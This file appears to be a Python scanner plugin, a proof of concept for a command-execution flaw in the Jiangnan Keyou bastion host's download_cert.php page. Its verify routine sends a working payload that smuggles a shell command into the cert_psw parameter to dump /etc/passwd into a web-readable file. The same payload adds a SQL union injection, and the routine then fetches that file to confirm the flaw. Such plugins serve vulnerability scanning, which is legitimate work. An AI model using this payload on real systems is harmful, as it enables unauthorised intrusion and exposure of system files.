# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urlparse
import time


class Vuln(ABVuln):
    vuln_id = 'Keyou_0005'  # 平台漏洞编号，留空
    name = '江南科友堡垒机 命令执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-09-21'  # 漏洞公布时间
    desc = '''  
        江南科友运维安全审计系统（HAC）在 /system/download_cert.php 页面命令执行漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '江南科友堡垒机'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '14a4e3c0-c028-4a2a-84be-89119851f176'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # wooyun-2014-076864
            hh = hackhttp.hackhttp()
            arg = self.target
            payload = '/system/download_cert.php?cert_psw=3|%20cat%20/etc/passwd%20%3E%3E%20/usr/local/apache2/htdocs/project/www/upload/bug.txt%20|&user_id=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13--%20a&manager=1'
            target = arg + payload
            code, head, res, errcode, _ = hh.http(target)
            shell_path = '/upload/bug.txt'
            verify_url = arg + shell_path
            code, head, res, errcode, _ = hh.http(verify_url)
            if code == 200 and ('root:x' in res) and ('bin:' in res):
                # security_hole(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
